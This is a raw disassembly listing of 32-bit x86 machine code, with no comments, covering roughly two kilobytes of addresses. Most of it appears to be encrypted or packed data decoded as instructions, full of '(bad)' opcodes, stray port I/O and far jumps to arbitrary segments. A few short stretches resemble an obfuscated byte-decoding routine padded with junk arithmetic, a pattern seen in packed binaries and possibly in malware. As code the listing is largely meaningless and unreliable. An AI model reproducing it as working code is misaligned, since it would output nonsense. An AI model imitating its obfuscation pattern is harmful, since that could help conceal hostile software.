  4039ca:	daa    
  4039cb:	inc    esi
  4039cc:	xlat   BYTE PTR ds:[ebx]
  4039cd:	sbb    ecx,DWORD PTR ds:0x6ef46a57
  4039d3:	scas   eax,DWORD PTR es:[edi]
  4039d4:	call   0x68b98097
  4039d9:	shr    BYTE PTR [ecx+ebp*4],cl
  4039dc:	sbb    ebp,esi
  4039de:	mov    ds:0x399175fa,al
  4039e3:	jne    0x40399e
  4039e5:	stos   DWORD PTR es:[edi],eax
  4039e6:	cmp    eax,0x93b749a6
  4039eb:	jmp    0xadc0:0xb8e942e1
  4039f2:	pop    esp
  4039f3:	xchg   ebx,eax
  4039f4:	push   esi
  4039f5:	jle    0x40399b
  4039f7:	jb     0x403a14
  4039f9:	int    0xc1
  4039fb:	cs ins DWORD PTR es:[edi],dx
  4039fd:	mov    dh,0xe
  4039ff:	jnp    0x403a14
  403a01:	dec    eax
  403a02:	sub    ebp,DWORD PTR [ebp-0x54]
  403a05:	jnp    0x403992
  403a07:	fbld   TBYTE PTR [eax]
  403a09:	mov    edx,0x498debdb
  403a0e:	aam    0x30
  403a10:	cwde   
  403a11:	es ds jnp 0x403a49
  403a15:	push   eax
  403a16:	sub    esi,DWORD PTR [ecx]
  403a18:	fld    TBYTE PTR [edi]
  403a1a:	out    0xe2,eax
  403a1c:	scas   al,BYTE PTR es:[edi]
  403a1d:	ret    0x245a
  403a20:	(bad)  
  403a21:	push   esi
  403a22:	repnz xchg ebx,eax
  403a24:	fidivr WORD PTR [ebp+edx*8-0x636febe9]
  403a2b:	push   eax
  403a2c:	in     al,0x63
  403a2e:	jmp    0x5597abe0
  403a33:	cld    
  403a34:	jle    0x403a58
  403a36:	out    0xb2,eax
  403a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a39:	pop    es
  403a3a:	neg    DWORD PTR [esi+0x79]
  403a3d:	pusha  
  403a3e:	push   0x60dc1505
  403a43:	pop    ss
  403a44:	push   0x9a078e03
  403a49:	xchg   ch,ah
  403a4b:	in     eax,0x21
  403a4d:	jl     0x403a1f
  403a4f:	xor    BYTE PTR [ebp+esi*2-0x124fecc0],ah
  403a56:	pop    ebp
  403a57:	in     eax,dx
  403a58:	test   al,0xd1
  403a5a:	sub    eax,0x8b921549
  403a5f:	(bad)  
  403a60:	jg     0x403a6e
  403a62:	mov    esp,0x76214d65
  403a67:	add    edi,eax
  403a69:	inc    eax
  403a6a:	loope  0x403acd
  403a6c:	jmp    0x403a82
  403a6e:	sbb    esi,esi
  403a70:	dec    edi
  403a71:	mov    cl,0x41
  403a73:	sbb    al,0x37
  403a75:	out    0xb5,eax
  403a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a79:	push   cs
  403a7a:	pop    edx
  403a7b:	adc    al,0x30
  403a7d:	leave  
  403a7e:	and    al,BYTE PTR [eax+eiz*1+0x1b]
  403a82:	xor    BYTE PTR [ebx],ah
  403a84:	pop    ebx
  403a85:	push   edx
  403a86:	shl    DWORD PTR [ecx-0x357d8825],1
  403a8c:	ss frndint 
  403a8f:	xchg   ebx,eax
  403a90:	push   ds
  403a91:	ins    BYTE PTR es:[edi],dx
  403a92:	stos   DWORD PTR es:[edi],eax
  403a93:	arpl   WORD PTR [eax+edx*2-0x52e094f3],di
  403a9a:	jns    0x7e515365
  403aa0:	cdq    
  403aa1:	jmp    0x41b8:0x21612ccd
  403aa8:	mov    ds:0x43c575bf,al
  403aad:	dec    esi
  403aae:	jno    0x403b2c
  403ab0:	mov    edi,0xc3a182b8
  403ab5:	mov    ah,ch
  403ab7:	(bad)
  403aba:	test   al,0x53
  403abc:	fst    QWORD PTR [esi+0x43bf1db2]
  403ac2:	lods   eax,DWORD PTR ds:[esi]
  403ac3:	test   al,0x2
  403ac5:	cwde   
  403ac6:	jb     0x403a49
  403ac8:	and    al,0xb2
  403aca:	mov    ebp,0x7b89857d
  403acf:	in     eax,dx
  403ad0:	jg     0x403a8f
  403ad2:	sti    
  403ad3:	fild   QWORD PTR [edx]
  403ad5:	sbb    eax,0x453da7
  403ada:	outs   dx,BYTE PTR ds:[esi]
  403adb:	out    dx,al
  403adc:	fisubr WORD PTR [edi]
  403ade:	push   ds
  403adf:	fcmovnbe st,st(2)
  403ae1:	cmp    DWORD PTR [edi+0x570e3879],edx
  403ae7:	inc    edx
  403ae8:	lea    ecx,[ebx-0xd]
  403aeb:	adc    cl,dh
  403aed:	js     0x403b2d
  403aef:	mov    al,BYTE PTR es:[ebp-0x1]
  403af3:	movzx  ecx,WORD PTR ds:0x42e6eb
  403afa:	adc    DWORD PTR ds:0x42fd76,ecx
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x1ec98c97],esi
  403b3e:	loopne 0x403b05
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x2f70707d
  403b48:	in     al,0xb
  403b4a:	mov    al,ds:0x96f275a3
  403b4f:	iret   
  403b50:	lods   al,BYTE PTR ds:[esi]
  403b51:	ins    BYTE PTR es:[edi],dx
  403b52:	and    DWORD PTR fs:[edx+0x2c],edx
  403b56:	lds    edi,FWORD PTR [eax]
  403b58:	fldenv [ecx]
  403b5a:	pop    ds
  403b5b:	mov    bh,0xb9
  403b5d:	mov    WORD PTR [ecx-0x16629555],gs
  403b63:	sbb    eax,DWORD PTR [esi+ebx*4]
  403b66:	push   ecx
  403b67:	shr    BYTE PTR [edi+eax*4+0x4e071680],0x37
  403b6f:	jnp    0x403b28
  403b71:	mov    ds:0xb752b3f6,al
  403b76:	fwait
  403b77:	sbb    ecx,DWORD PTR [ecx]
  403b79:	cmp    ecx,DWORD PTR [ecx*2+0x6ce489ee]
  403b80:	inc    edi
  403b81:	xchg   ebx,edi
  403b83:	pop    ds
  403b84:	mov    ds:0x5934712a,al
  403b89:	add    eax,0x5d6ef52
  403b8e:	shr    DWORD PTR [esi],0xe5
  403b91:	mov    ebp,0x8314e600
  403b96:	in     al,dx
  403b97:	or     edi,DWORD PTR ds:0xf138f77e
  403b9d:	cs add al,0x91
  403ba0:	sbb    al,0x30
  403ba2:	mov    bh,0x3f
  403ba4:	or     eax,edi
  403ba6:	pushf  
  403ba7:	jne    0x403b81
  403ba9:	cs hlt 
  403bab:	sub    eax,0x65d76c8a
  403bb0:	shl    DWORD PTR [edi-0x11],0xe7
  403bb4:	cmp    dh,BYTE PTR [edx-0x6]
  403bb7:	adc    DWORD PTR [eax],esp
  403bb9:	pop    ebx
  403bba:	scas   al,BYTE PTR es:[edi]
  403bbb:	push   edi
  403bbc:	mov    ds:0xf697233,al
  403bc1:	call   eax
  403bc3:	push   ds
  403bc4:	in     eax,0x74
  403bc6:	outs   dx,BYTE PTR ds:[esi]
  403bc7:	stc    
  403bc8:	and    bl,BYTE PTR [eax]
  403bca:	arpl   WORD PTR [edx],bx
  403bcc:	in     eax,dx
  403bcd:	pushf  
  403bce:	push   ebx
  403bcf:	pop    eax
  403bd0:	sbb    bl,BYTE PTR [esi]
  403bd2:	loop   0x403c39
  403bd4:	cmp    ebx,ebp
  403bd6:	mov    ds:0x236fa9d1,eax
  403bdb:	fadd   QWORD PTR [eax+0x2fbcc31d]
  403be1:	mov    ecx,0x8948333b
  403be6:	mov    DWORD PTR [ebx+0xc],ecx
  403be9:	sti    
  403bea:	pop    edi
  403beb:	clc    
  403bec:	jnp    0x403c5e
  403bee:	or     BYTE PTR [edx-0x46],al
  403bf1:	jns    0x403b8f
  403bf3:	mov    ds:0xea3219b,eax
  403bf8:	fisttp QWORD PTR [esi]
  403bfa:	pop    ebx
  403bfb:	jb     0x403ba4
  403bfd:	pop    ds
  403bfe:	iret   
  403bff:	rcr    al,1
  403c01:	fidivr DWORD PTR [ecx]
  403c03:	(bad)  
  403c04:	mov    ebx,0x957a944b
  403c09:	xor    eax,0xcfa0bce9
  403c0e:	ds fwait
  403c10:	shl    BYTE PTR ds:0x6bf1ec63,cl
  403c16:	pop    ecx
  403c17:	out    0x41,al
  403c19:	or     al,0x10
  403c1b:	fs jnp 0x403c58
  403c1e:	cmc    
  403c1f:	ret    0x846d
  403c22:	aam    0x64
  403c24:	push   0xffffffa9
  403c26:	jge    0x403c28
  403c28:	test   DWORD PTR [ecx],0x9e75a021
  403c2e:	xchg   esp,eax
  403c2f:	popw   es
  403c31:	pop    edx
  403c32:	rcl    esp,0x34
  403c35:	dec    eax
  403c36:	cmp    al,ch
  403c38:	and    bl,0xf7
  403c3b:	test   BYTE PTR [ebp-0x42cf8175],dh
  403c41:	sub    DWORD PTR [ebp+0x4cc88c1b],esp
  403c47:	out    0xdf,eax
  403c49:	int3   
  403c4a:	jl     0x403bd2
  403c4c:	nop
  403c4d:	scas   eax,DWORD PTR es:[edi]
  403c4e:	or     ebp,DWORD PTR [esp+ecx*1-0x2c]
  403c52:	adc    esi,ebx
  403c54:	mov    dl,0x1b
  403c56:	xor    dh,BYTE PTR [ebp-0xc]
  403c59:	stc    
  403c5a:	sbb    bl,bl
  403c5c:	into   
  403c5d:	rcl    BYTE PTR [esi+0x73],1
  403c60:	dec    esp
  403c61:	into   
  403c62:	test   BYTE PTR [ebx+0x150ddd93],ah
  403c68:	mov    edi,0x25a9f8ea
  403c6d:	clc    
  403c6e:	fnstsw WORD PTR [edx+0x12cebd7a]
  403c74:	lock repnz xor dl,cl
  403c78:	stos   DWORD PTR es:[edi],eax
  403c79:	pusha  
  403c7a:	shl    DWORD PTR [ebx-0x6ddf5664],0x41
  403c81:	stc    
  403c82:	into   
  403c83:	mov    dl,bh
  403c85:	addr16 leave 
  403c87:	pop    edx
  403c88:	mov    al,0x90
  403c8a:	neg    DWORD PTR [ecx+0x1e]
  403c8d:	pop    eax
  403c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c8f:	jg     0x403c26
  403c91:	pop    ss
  403c92:	xor    al,0x45
  403c94:	je     0x403cf8
  403c96:	ds and BYTE PTR cs:[ebp-0x37],cl
  403c9b:	dec    edi
  403c9c:	xchg   edx,ecx
  403c9e:	pop    eax
  403c9f:	dec    eax
  403ca0:	mov    esi,0xe41495dc
  403ca5:	ins    DWORD PTR es:[edi],dx
  403ca6:	jbe    0x403ce6
  403ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ca9:	and    al,0xed
  403cab:	mov    al,0x62
  403cad:	add    BYTE PTR [esi-0x26],cl
  403cb0:	dec    ecx
  403cb1:	jo     0x403d01
  403cb3:	pushf  
  403cb4:	lods   al,BYTE PTR ds:[esi]
  403cb5:	jp     0x403ccd
  403cb7:	dec    ebx
  403cb8:	rcr    dh,cl
  403cba:	adc    al,0xfb
  403cbc:	stos   DWORD PTR es:[edi],eax
  403cbd:	das    
  403cbe:	ins    BYTE PTR es:[edi],dx
  403cbf:	lods   al,BYTE PTR ds:[esi]
  403cc0:	in     al,0xb
  403cc2:	or     DWORD PTR [ebp*2-0x7b274530],0xffffffc0
  403cca:	push   esp
  403ccb:	add    ah,dl
  403ccd:	loopne 0x403d0a
  403ccf:	fwait
  403cd0:	push   0xfffffffd
  403cd2:	lods   al,BYTE PTR ds:[esi]
  403cd3:	es mov ebp,0xfe50eb20
  403cd9:	rcr    cl,0x87
  403cdc:	sbb    eax,0x3ecb8eff
  403ce1:	mov    edi,0x2f100028
  403ce6:	fild   DWORD PTR [ecx-0x2d]
  403ce9:	retf   0xcf33
  403cec:	sbb    BYTE PTR [ebp+0x68b58937],cl
  403cf2:	(bad)  
  403cf3:	push   0x979ae15e
  403cf8:	stos   DWORD PTR es:[edi],eax
  403cf9:	mov    ds:0xc4a90351,al
  403cfe:	push   ebx
  403cff:	or     DWORD PTR [esi+0x6afb1c99],ebp
  403d05:	clc    
  403d06:	ror    DWORD PTR [edx],0xf1
  403d09:	je     0x403d33
  403d0b:	dec    edi
  403d0c:	xor    al,0x8d
  403d0e:	mov    ah,0x55
  403d10:	adc    al,0x9a
  403d12:	vmread DWORD PTR [esi],edx
  403d15:	jmp    0x34d3:0x1f5526cd
  403d1c:	retf   0xce05
  403d1f:	aaa    
  403d20:	and    al,0xde
  403d22:	xor    dh,0xdf
  403d25:	mov    ebp,0x92773c08
  403d2a:	push   ebx
  403d2b:	retf   
  403d2c:	add    ah,cl
  403d2e:	(bad)  
  403d30:	hlt    
  403d31:	jo     0x403d44
  403d33:	xchg   BYTE PTR [edx+ecx*8-0x39],dl
  403d37:	sub    al,dh
  403d39:	xor    bl,BYTE PTR [esi+0x2f]
  403d3c:	or     DWORD PTR [esi],edx
  403d3e:	lea    ecx,[esi]
  403d40:	jo     0x403d4d
  403d42:	cli    
  403d43:	fistp  WORD PTR [eax-0x6a]
  403d46:	mov    al,0x0
  403d48:	dec    ecx
  403d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d4a:	hlt    
  403d4b:	shl    edx,1
  403d4d:	into   
  403d4e:	jb     0x403dc5
  403d50:	je     0x403d43
  403d52:	retf   
  403d53:	outs   dx,BYTE PTR ds:[esi]
  403d54:	repz fcmove st,st(3)
  403d57:	mov    WORD PTR [edi],?
  403d59:	out    0x8c,al
  403d5b:	stc    
  403d5c:	adc    BYTE PTR [edx-0x6b67e5d5],dh
  403d62:	call   0x4c64d8b0
  403d67:	mov    eax,ds:0x3a803da3
  403d6c:	mov    ebp,es
  403d6e:	jg     0x403d4c
  403d70:	pop    ebp
  403d71:	inc    ecx
  403d72:	jle    0x403d6d
  403d74:	cmp    DWORD PTR gs:[ebx*4+0x343facfd],0x57
  403d7d:	add    BYTE PTR [ebx-0x70],0x7b
  403d81:	mov    ds,WORD PTR [ecx-0x1f08cbda]
  403d87:	mov    ds:0x28884f2b,al
  403d8c:	or     BYTE PTR [eax+0x43],0x3c
  403d90:	or     edi,DWORD PTR [esi-0x452f4436]
  403d96:	sbb    eax,0xd7c8ef71
  403d9b:	in     al,dx
  403d9c:	ds dec esp
  403d9e:	adc    al,BYTE PTR [edi-0x8dfdbe4]
  403da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403da5:	mov    edi,DWORD PTR [ecx-0x2c]
  403da8:	sub    eax,0x6e44a135
  403dad:	je     0x403dc4
  403daf:	mov    dl,0x94
  403db1:	shl    BYTE PTR [edx+0x7],1
  403db4:	dec    ebx
  403db5:	push   edi
  403db6:	xor    eax,esi
  403db8:	pop    ecx
  403db9:	(bad)  
  403dba:	xlat   BYTE PTR ds:[ebx]
  403dbb:	test   DWORD PTR [ebx],0xa5dc84e6
  403dc1:	inc    DWORD PTR [eax+0x5757379a]
  403dc7:	cdq    
  403dc8:	fwait
  403dc9:	xor    eax,DWORD PTR [ecx-0x70]
  403dcc:	and    BYTE PTR [edi*8+0x24520e0f],0x2
  403dd4:	inc    eax
  403dd5:	clc    
  403dd6:	out    dx,eax
  403dd7:	xchg   edi,eax
  403dd8:	mov    ah,0x9b
  403dda:	imul   edx,DWORD PTR [ecx],0xfb45cc62
  403de0:	xchg   esi,eax
  403de1:	push   ds
  403de2:	or     bh,BYTE PTR [edi]
  403de4:	in     al,dx
  403de5:	loop   0x403e42
  403de7:	sub    DWORD PTR [ecx+0x2dd4865a],ecx
  403ded:	popa   
  403dee:	(bad)  
  403df0:	aam    0x41
  403df2:	loope  0x403e60
  403df4:	aaa    
  403df5:	in     eax,0x19
  403df7:	pop    edi
  403df8:	mov    eax,ds:0x3def29b8
  403dfd:	push   0x729f021
  403e02:	outs   dx,BYTE PTR ds:[esi]
  403e03:	mov    ecx,0xc8b5357e
  403e08:	jmp    0xbec6:0x3b7a8d37
  403e0f:	test   eax,0xee21a5c9
  403e14:	pop    ebx
  403e15:	in     al,0xd0
  403e17:	jg     0x403de5
  403e19:	aad    0x50
  403e1b:	repnz add BYTE PTR [ebp+0x5e0d4fab],0x55
  403e23:	jbe    0x403e5c
  403e25:	jecxz  0x403e22
  403e27:	mov    ecx,DWORD PTR [ecx-0x46]
  403e2a:	fnstsw WORD PTR [esi-0x43f2c19a]
  403e30:	and    DWORD PTR [esi+0x1e],esi
  403e33:	jnp    0x403e04
  403e35:	in     eax,0x73
  403e37:	pop    esp
  403e38:	xor    eax,0xd6524aa7
  403e3d:	stos   DWORD PTR es:[edi],eax
  403e3e:	inc    edx
  403e3f:	mov    bl,0xe2
  403e41:	(bad)  
  403e42:	clc    
  403e43:	pushf  
  403e44:	xor    esp,ecx
  403e46:	arpl   WORD PTR [edi],bp
  403e48:	(bad)  
  403e49:	inc    esi
  403e4a:	push   ss
  403e4b:	mov    ds:0x12221884,al
  403e50:	imul   esp,DWORD PTR [ecx+0x51e80216],0x1afaba05
  403e5a:	push   0x7964ded6
  403e5f:	out    dx,al
  403e60:	clc    
  403e61:	jmp    0x403de6
  403e63:	add    ebp,DWORD PTR [eax+0x5a]
  403e66:	sub    al,0xe1
  403e68:	and    dh,al
  403e6a:	aad    0x43
  403e6c:	pop    edx
  403e6d:	or     ah,BYTE PTR [edi-0x4e]
  403e70:	out    0x99,al
  403e72:	add    DWORD PTR [esi+0x14],0xfffffffc
  403e76:	jmp    0x403e16
  403e78:	dec    esi
  403e79:	int    0xf6
  403e7b:	push   ss
  403e7c:	and    al,0x79
  403e7e:	cmp    dh,ah
  403e80:	mov    ch,0x99
  403e82:	inc    edx
  403e83:	push   ebp
  403e84:	jno    0x403e18
  403e86:	sbb    edx,DWORD PTR [edx+0x45c7ecd5]
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x11a41c35
  403eec:	add    BYTE PTR [edx+0x70701b82],0x3d
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403f03
  403ef7:	dec    edi
  403ef8:	push   es
  403ef9:	(bad)  
  403efb:	stos   DWORD PTR es:[edi],eax
  403efc:	call   0x5f46:0xb5dcca3c
  403f03:	je     0x403f39
  403f05:	cmp    eax,0x1522611c
  403f0a:	in     eax,0xf
  403f0c:	sti    
  403f0d:	leave  
  403f0e:	pop    ebp
  403f0f:	popf   
  403f10:	ins    DWORD PTR es:[edi],dx
  403f11:	jb     0x403f4c
  403f13:	cmp    ch,dh
  403f15:	cli    
  403f16:	inc    ebp
  403f17:	mov    ebx,0xde5fd865
  403f1c:	push   edx
  403f1d:	mov    eax,ds:0x57e886a4
  403f22:	mov    al,0x63
  403f24:	fs call 0x4841cfce
  403f2a:	mov    edx,0xe7477d38
  403f2f:	sub    dl,BYTE PTR [edi]
  403f31:	das    
  403f32:	in     eax,dx
  403f33:	popf   
  403f34:	(bad)  
  403f36:	fild   QWORD PTR [ebp-0x2992b2ed]
  403f3c:	(bad)  
  403f3d:	jae    0x403f04
  403f3f:	or     eax,DWORD PTR [ebp+0x6]
  403f42:	adc    esi,DWORD PTR [edx]
  403f44:	imul   ecx
  403f46:	or     eax,0x4e63be43
  403f4b:	dec    esi
  403f4c:	mov    ebp,0xb9d84e22
  403f51:	jge    0x403f8f
  403f53:	adc    al,0x8a
  403f56:	xchg   BYTE PTR [ebp-0x1d5a6c19],al
  403f5c:	out    0x37,al
  403f5e:	(bad)  [edx+edx*2-0x341404d6]
  403f65:	mov    cl,dh
  403f67:	cmp    al,dl
  403f69:	pushf  
  403f6a:	ss mul esi
  403f6d:	or     eax,0xb731109a
  403f72:	scas   eax,DWORD PTR es:[edi]
  403f73:	mov    ebp,0x3a72f403
  403f78:	fidiv  WORD PTR [edi]
  403f7a:	or     al,0x60
  403f7c:	xchg   ebx,eax
  403f7d:	ret    
  403f7e:	push   ebp
  403f7f:	in     eax,dx
  403f80:	test   eax,0x931438e8
  403f85:	mov    ecx,0xd8ed3726
  403f8a:	cdq    
  403f8b:	sub    al,0xff
  403f8d:	stos   BYTE PTR es:[edi],al
  403f8e:	add    eax,0xe25bf4bc
  403f93:	or     BYTE PTR [ebp+0x7f],al
  403f96:	fdiv   QWORD PTR [ecx-0x74db9361]
  403f9c:	jl     0x403fad
  403f9e:	test   BYTE PTR [edx+0x3f564f09],cl
  403fa4:	mov    bh,0x17
  403fa6:	mov    ch,0x39
  403fa8:	call   0x60ccf2d0
  403fad:	pop    esi
  403fae:	pop    esi
  403faf:	fdiv   st(6),st
  403fb1:	dec    eax
  403fb2:	imul   ebp,DWORD PTR [ecx-0x5c],0x6d
  403fb6:	pop    esi
  403fb7:	or     ch,BYTE PTR [ebx]
  403fb9:	pop    es
  403fba:	sub    eax,0x5624fcf9
  403fbf:	jns    0x403f88
  403fc1:	and    eax,0xd456b475
  403fc6:	inc    edx
  403fc7:	test   DWORD PTR [ecx],ebp
  403fc9:	mov    ah,0xca
  403fcb:	cmp    al,0xa4
  403fcd:	xchg   esi,eax
  403fce:	sbb    dl,BYTE PTR [esp+eiz*4]
  403fd1:	int3   
  403fd2:	out    0x29,eax
  403fd4:	sbb    BYTE PTR [edx],ah
  403fd6:	sahf   
  403fd7:	into   
  403fd8:	ret    0x5c43
  403fdb:	jmp    0xacdca643
  403fe0:	stos   DWORD PTR es:[edi],eax
  403fe1:	(bad)  
  403fe2:	pop    esi
  403fe3:	sbb    BYTE PTR [ecx-0x731d0010],al
  403fe9:	repnz stos DWORD PTR es:[edi],eax
  403feb:	jae    0x403fb7
  403fed:	outs   dx,DWORD PTR ds:[esi]
  403fee:	inc    esi
  403fef:	xor    ecx,DWORD PTR [ebx+0x13]
  403ff2:	cli    
  403ff3:	sti    
  403ff4:	aas    
  403ff5:	dec    edx
  403ff6:	leave  
  403ff7:	mov    ch,BYTE PTR [edi+esi*2+0xd]
  403ffb:	and    ecx,DWORD PTR [esi-0x2c]
  403ffe:	and    BYTE PTR [edx],dh
  404000:	xchg   esi,eax
  404001:	jg     0x403ff1
  404003:	dec    edi
  404004:	inc    esp
  404005:	push   ebp
  404006:	sub    DWORD PTR [edi+ebp*2+0x5c162e75],ebp
  40400d:	push   ebp
  40400e:	pop    ds
  40400f:	scas   al,BYTE PTR es:[edi]
  404010:	rcl    bh,1
  404012:	(bad)  
  404013:	dec    ebx
  404014:	push   ecx
  404015:	inc    edi
  404016:	call   0x5ea2:0x44071540
  40401d:	sbb    al,0xcd
  40401f:	cmp    ah,BYTE PTR [esi+0x2f]
  404022:	and    DWORD PTR [eax],ebp
  404024:	xchg   DWORD PTR [ebp+0x5a],edi
  404027:	add    eax,0x9c9c6b6d
  40402c:	pop    edi
  40402d:	sbb    dl,BYTE PTR [edx+0x2329d75b]
  404033:	js     0x404069
  404035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404036:	out    dx,eax
  404037:	add    eax,0xfffffff8
  40403a:	inc    edi
  40403b:	ds icebp 
  40403d:	repz mov al,BYTE PTR [ebp-0xf]
  404041:	xlat   BYTE PTR ds:[ebx]
  404042:	mov    ah,0xfb
  404044:	int3   
  404045:	js     0x403feb
  404047:	mov    dh,0x9
  404049:	pop    edi
  40404a:	mov    edx,0x359f2bb4
  40404f:	in     al,0xec
  404051:	and    ebx,DWORD PTR [edx+0x90f303d]
  404057:	hlt    
  404058:	mov    bl,0x5b
  40405a:	es adc eax,0x30b52cea
  404060:	mov    edx,0xf4a910b0
  404065:	gs push 0x3874456d
  40406b:	(bad)  
  40406c:	fild   WORD PTR [edx-0x10d7ae98]
  404072:	aaa    
  404073:	sub    dl,BYTE PTR [eax*4+0x40e7e205]
  40407a:	jnp    0x404027
  40407c:	fsub   DWORD PTR [ebx-0x508c2877]
  404082:	add    eax,0x53b60464
  404087:	mov    cl,0xae
  404089:	mov    edi,ecx
  40408b:	repnz lahf 
  40408d:	or     eax,0x95f7ea5c
  404092:	xchg   esp,eax
  404093:	pusha  
  404094:	mov    DWORD PTR [ecx+0x39a96ecc],0x326bd3dc
  40409e:	aaa    
  40409f:	int3   
  4040a0:	xchg   edi,eax
  4040a1:	pop    ebp
  4040a2:	xor    al,0xcb
  4040a4:	in     eax,0x15
  4040a6:	adc    DWORD PTR [edi],edx
  4040a8:	sbb    eax,0x5f614e2c
  4040ad:	lods   eax,DWORD PTR ds:[esi]
  4040ae:	cld    
  4040af:	repz shr BYTE PTR [ebx-0x4b],0x9
  4040b4:	mov    eax,ds:0x419532cd
  4040b9:	les    edx,FWORD PTR [ebx-0xedb9f7]
  4040bf:	push   esi
  4040c0:	add    al,0x8a
  4040c2:	fs adc dh,dh
  4040c5:	jmp    FWORD PTR [ebx]
  4040c7:	push   ds
  4040c8:	sub    BYTE PTR [edi],bh
  4040ca:	imul   edi,DWORD PTR [ebx-0x64],0x20
  4040ce:	mov    DWORD PTR [esi],edi
  4040d0:	dec    ecx
  4040d1:	stos   BYTE PTR es:[edi],al
  4040d2:	test   DWORD PTR [ebp-0x51],edi
  4040d5:	mov    bh,0xa5
  4040d7:	mov    dh,0xd9
  4040d9:	mov    edi,0xefb5a9a6
  4040de:	add    DWORD PTR [edx+0x656df29a],ebp
  4040e4:	das    
  4040e5:	xlat   BYTE PTR ds:[ebx]
  4040e6:	push   ecx
  4040e7:	stc    
  4040e8:	mov    ds:0x6b924946,al
  4040ed:	xor    al,0x91
  4040ef:	cdq    
  4040f0:	add    BYTE PTR [edx-0x17],al
  4040f3:	dec    edi
  4040f4:	(bad)  
  4040f5:	mov    ch,0x4b
  4040f7:	mov    al,ds:0x236aeccd
  4040fc:	mov    BYTE PTR [eax+0x7de9161e],bl
  404102:	js     0x404097
  404104:	(bad)  
  404105:	pop    ss
  404106:	cwde   
  404107:	ss ins BYTE PTR es:[edi],dx
  404109:	xor    DWORD PTR [eax+0x4f781844],ebx
  40410f:	retf   0x59
  404112:	sahf   
  404113:	mov    dh,0x31
  404115:	sub    eax,0xc41950a2
  40411a:	mov    ebx,0xc544926b
  40411f:	int    0x9a
  404121:	xor    esi,DWORD PTR [edx+esi*2+0x1caff3ee]
  404128:	mov    ah,0x68
  40412a:	jp     0x4041a7
  40412c:	(bad)  
  40412d:	inc    ebx
  40412e:	or     DWORD PTR [ebx],eax
  404130:	jge    0x4040b3
  404132:	inc    edx
  404133:	sub    cl,dh
  404135:	jmp    0xb44541e8
  40413a:	dec    ecx
  40413b:	(bad)  
  40413d:	icebp  
  40413e:	fistp  WORD PTR [edi]
  404140:	adc    ch,BYTE PTR [edi+0x4444c4ac]
  404146:	sbb    DWORD PTR [ebp+0x60],edi
  404149:	adc    al,0x25
  40414b:	retf   
  40414c:	mov    ch,0xef
  40414e:	bound  ebp,QWORD PTR [edx]
  404150:	icebp  
  404151:	mov    eax,0xdebedbeb
  404156:	cmp    BYTE PTR [ecx+0xf2c5569],ah
  40415c:	cdq    
  40415d:	and    ecx,DWORD PTR [esi-0x8]
  404160:	(bad)  
  404162:	popf   
  404163:	push   0xa9241fbd
  404168:	lods   al,BYTE PTR ss:[esi]
  40416a:	out    0xb1,al
  40416c:	and    dl,dh
  40416e:	neg    esi
  404170:	xchg   dl,cl
  404172:	xchg   cl,dh
  404174:	into   
  404175:	in     al,0xc4
  404177:	popa   
  404178:	and    DWORD PTR [esi-0x4],esi
  40417b:	push   esp
  40417c:	sub    ebp,DWORD PTR [ebx+0x59]
  40417f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404180:	xchg   edx,eax
  404181:	xchg   edi,ebp
  404183:	sub    BYTE PTR [edi],al
  404185:	dec    esi
  404186:	mov    ds:0x6c945d0d,eax
  40418b:	gs inc esp
  40418d:	jp     0x404184
  40418f:	loope  0x40417e
  404191:	(bad)
  404194:	adc    DWORD PTR [ebx+0x3ad45276],ebp
  40419a:	xor    esi,esi
  40419c:	je     0x4041ec
  40419e:	and    DWORD PTR [edx],edi
  4041a0:	and    DWORD PTR [ecx],edx
  4041a2:	call   0xce28:0x60bb0800
  4041a9:	mov    edi,0xbbfca1e0
  4041ae:	sahf   
  4041af:	push   ds
  4041b0:	xor    DWORD PTR [esi],ebx
  4041b2:	jns    0x4041fb
  4041b4:	jmp    0x404215
  4041b6:	and    eax,0x1d706250
  4041bb:	shl    DWORD PTR [edx+0x6c],0xe3
  4041bf:	add    ebp,edx
  4041c1:	push   esp
  4041c2:	and    al,0x6a
  4041c4:	test   ebx,ebx
  4041c6:	pusha  
  4041c7:	clc    
  4041c8:	inc    ebp
  4041c9:	les    esi,FWORD PTR [esi-0x77]
  4041cc:	jne    0x404236
  4041ce:	mov    BYTE PTR [esi-0x5d],ah
  4041d1:	add    ecx,edx
  4041d3:	pop    esp
  4041d4:	mov    esi,0x50084c18
